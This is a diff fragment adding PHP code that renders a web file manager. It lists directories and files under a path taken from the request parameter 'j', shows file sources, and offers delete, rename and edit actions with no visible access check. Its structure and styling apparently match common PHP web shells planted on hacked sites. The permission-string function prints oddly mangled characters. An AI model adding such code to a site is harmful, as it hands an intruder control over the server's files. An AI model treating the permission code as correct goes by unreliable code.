+$pa = getcwd();
+echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr>';
+foreach($scandir as $g){
+if(!is_dir("$j/$g") || $g == '.' || $g == '..') continue;
+echo "<tr>
+<td class=td_home>D<a href=\"?j=$j/$g\"> $g</a></td>
+<td class=td_home><center>D</center></td>
+<td class=td_home><center>";
+if(is_writable("$j/$g")) echo '<font color="black">';
+elseif(!is_readable("$j/$g")) echo '<font color="red">';
+echo z("$j/$g");
+if(is_writable("$j/$g") || !is_readable("$j/$g")) echo '</font>';
+echo "</center></td>
+<td class=td_home align=right> <form method=\"POST\" action=\"?option&j=$j\">
+<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15\">
+<option value=\"Action\">+</option>
+<option value=\"delete\">Delete</option>
+<option value=\"rename\">Rename</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"g\">
+<input type=\"hidden\" name=\"j\" value=\"$j/$g\">
+<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15\"/>
+</form></center></td>
+</tr>";
+}
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($scandir as $file){
+if(!is_file("$j/$file")) continue;
+$size = filesize("$j/$file")/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+echo "<tr>
+<td class=td_home>F<a href=\"?filesrc=$j/$file&j=$j\"> $file</a></td>
+<td class=td_home><center>".$size."</center></td>
+<td class=td_home><center>";
+if(is_writable("$j/$file")) echo '<font color="green">';
+elseif(!is_readable("$j/$file")) echo '<font color="red">';
+echo z("$j/$file");
+if(is_writable("$j/$file") || !is_readable("$j/$file")) echo '</font>';
+echo "</center></td>
+<td class=td_home align=right> <form method=\"POST\" action=\"?option&j=$j\">
+<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15\">
+<option value=\"Action\">+</option>
+<option value=\"delete\">Delete</option>
+<option value=\"edit\">Edit</option>
+<option value=\"rename\">Rename</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"j\" value=\"$j/$file\">
+<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15\"/>
+</form></center></td>
+</tr>";
+}
+echo '</table>
+</div>';
+}
+function z($file){
+$z = fileperms($file);
+if (($z & 0xC000) == 0xC000) {
+$info = 's';
+} elseif (($z & 0xA000) == 0xA000) {
+$info = '4';
+} elseif (($z & 0x8000) == 0x8000) {
+$info = '0';
+} elseif (($z & 0x6000) == 0x6000) {
+$info = '3';
+} elseif (($z & 0x4000) == 0x4000) {
+$info = '3';
+} elseif (($z & 0x2000) == 0x2000) {
+$info = 'c';
+} elseif (($z & 0x1000) == 0x1000) {
+$info = 'p';
+} else {
+$info = '5';
+}
+$info .= (($z & 0x0100) ? '2' : '0');
+$info .= (($z & 0x0080) ? '1' : '0');
+$info .= (($z & 0x0040) ?
+(($z & 0x0800) ? 's' : '6' ) :
+(($z & 0x0800) ? 'S' : '0'));
+$info .= (($z & 0x0020) ? '2' : '0');
+$info .= (($z & 0x0010) ? '1' : '0');
+$info .= (($z & 0x0008) ?
+(($z & 0x0400) ? 's' : '6' ) :
+(($z & 0x0400) ? 'S' : '0'));
+$info .= (($z & 0x0004) ? '2' : '0');
+$info .= (($z & 0x0002) ? '1' : '0');
+$info .= (($z & 0x0001) ?
+(($z & 0x0200) ? 't' : '6' ) :
+(($z & 0x0200) ? 'T' : '0'));
+return $info;
+}
+?>
